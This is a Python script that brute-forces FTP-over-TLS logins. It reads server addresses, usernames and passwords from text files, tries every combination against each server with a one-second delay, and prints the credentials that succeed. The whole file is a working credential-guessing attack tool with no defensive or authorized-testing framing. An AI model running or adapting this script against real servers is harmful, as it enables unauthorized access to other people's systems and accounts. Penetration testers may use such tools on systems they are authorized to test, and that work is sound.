from ftplib import FTP_TLS, error_perm
import time

def read_ip_ports(filename):
    with open(filename, 'r') as file:
        return [line.strip().split(':') for line in file.readlines()]

def read_usernames(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

def read_passwords(filename):
    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines()]

def test_login(ip, port, username, password):
    ftp = FTP_TLS()
    try:
        ftp.connect(ip, int(port))
        print(f"Attempting to connect to {ip}:{port} with username: {username} password:  {password}")
        ftp.auth()
        ftp.prot_p()
        ftp.login(username, password)
        print(f"Login successful for {username} on {ip}:{port}")
    except error_perm as e:
        #print(f"Login failed for {username} on {ip}:{port}: {e}")
        pass
    except Exception as e:
        #print(f"An error occurred for {username} on {ip}:{port}: {e}")
        pass
    finally:
        if 'ftp' in locals() and ftp.sock:
            ftp.quit()
            print("Connection closed")

servers = read_ip_ports('ipport.txt')
usernames = read_usernames('usernames.txt')
passwords = read_passwords('passwords.txt')

for ip, port in servers:
    for username in usernames:
        for password in passwords:
            test_login(ip, port, username, password)
            time.sleep(1)

print("All attempts completed.")
